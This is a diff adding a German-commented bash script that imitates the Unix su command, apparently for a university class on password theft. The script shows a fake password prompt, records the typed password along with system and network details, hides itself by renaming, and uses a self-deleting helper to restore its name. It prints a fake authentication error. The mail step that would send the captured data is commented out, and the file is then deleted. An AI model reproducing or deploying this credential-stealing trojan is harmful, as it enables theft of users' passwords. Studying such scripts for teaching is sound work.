@@ -1,0 +1,58 @@
+#!/bin/bash
+# Subversive Nachbildung des su  Befehls
+INFOFILE='su_infofile'
+UNAME_BIN='/usr/bin/uname -a'
+IP_BIN='/bin/ip a'
+MAIL_BIN='/usr/bin/mail'
+RM_BIN='/usr/bin/rm'
+SU_HIDDEN='su_hidden'
+MV_BIN='/usr/bin/mv'
+RENAME_SCRIPT='./su_rename'	# wenn im aktuellen Verzeichnis: ./ voransstellen
+				# sonst: absoluten Pfad angeben
+SLEEP_BIN='/usr/bin/sleep'
+SLEEP_TIME='30'
+CHMOD_BIN='/usr/bin/chmod'
+
+# Step 1: Verhalten nachbilden
+echo -n 'Passwort: '	# -n --> kein Zeilenvorschub
+read -s PASSWORD	# -s --> silent
+echo ''			# Zeilenumbruch nach Passworteingabe
+sleep 3
+# Fehlermeldung erst am Schluss ausgeben, damit dann verzögerungsfrei der Shell-Promt erscheint
+# echo 'su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt'
+
+# Step 2: Informationen sammeln
+echo 'Gesammelte Informationen'			>  $INFOFILE
+echo '________________________'			>> $INFOFILE
+echo 'Aufruf von su (user) : '$0 $1 $2 $3 $4    >> $INFOFILE
+echo 'Passwort: '$PASSWORD			>> $INFOFILE
+$UNAME_BIN					>> $INFOFILE
+$IP_BIN                                      	>> $INFOFILE
+echo '.'					>> $INFOFILE	# . auf Zeile allein beendet mail
+
+# Step 3: Informationen senden
+# E-Mail senden deaktiviert
+# $MAIL_BIN 	-s 'Passwortklau CS16-1' \
+#		-r 'ingolf.brunner@ba-leipzig.de' \
+#		'studierende@cs16-1.ba-leipzig.de'	< $INFOFILE
+$RM_BIN $INFOFILE	# Infofile löschen
+
+# Step 4: su Script verbergen
+$MV_BIN $0 $SU_HIDDEN
+
+# Step 5: nach Wartezeit zurück umbennen
+# Rename Script erzeugen
+echo '#!/bin/bash'				>  $RENAME_SCRIPT
+echo $RM_BIN' '$RENAME_SCRIPT			>> $RENAME_SCRIPT	# Script löscht sich selbst
+echo $SLEEP_BIN' '$SLEEP_TIME			>> $RENAME_SCRIPT
+echo $MV_BIN' '$SU_HIDDEN' '$0			>> $RENAME_SCRIPT	# Umbenennung rückgängig
+echo 'exit 0'					>> $RENAME_SCRIPT
+# Rename Script ausführbar machen und ausführen
+$CHMOD_BIN 777  $RENAME_SCRIPT
+$RENAME_SCRIPT &	# im Hintergrund ausführen
+
+# Step 6: Fehlermeldung ausgeben
+echo 'su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt'
+
+# Beenden mit Fehlerstatus 1
+exit 1
